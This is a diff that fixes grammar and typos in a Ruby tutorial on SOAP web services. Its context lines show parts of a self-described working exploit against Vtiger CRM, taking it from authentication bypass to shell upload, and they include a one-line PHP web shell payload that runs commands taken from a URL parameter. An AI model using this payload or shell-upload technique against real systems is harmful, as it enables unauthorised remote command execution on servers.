@@ -1,7 +1,7 @@
 # Interacting with Web Services
 
 ### SOAP - WSDL
-Generally speaking, dealing with SOAP means dealing with XMLs that which WSDL describes how to use that SOAP. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit
+Generally speaking, dealing with SOAP means dealing with XML messages and a WSDL file (also XML) that describes how to use a given SOAP API. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit
 
 ```
 gem install wasabi savon httpclient 
@@ -108,7 +108,7 @@ Results
 
 #### Hacking via SOAP vulnerabilities 
 
-This is a working exploit for Vtiger CRM SOAP from Auth-bypass to Shell upload 
+This is a working exploit for Vtiger CRM SOAP from auth-bypass to shell upload 
 ```ruby
 #!/usr/bin/env ruby
 # KING SABRI | @KINGSABRI
@@ -128,7 +128,7 @@ shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.p
 # Start client 
 client = Savon::Client.new(wsdl: url)
 
-# List all avialable operations 
+# List all available operations 
 puts "[*] List all available operations "
 puts client.operations
 
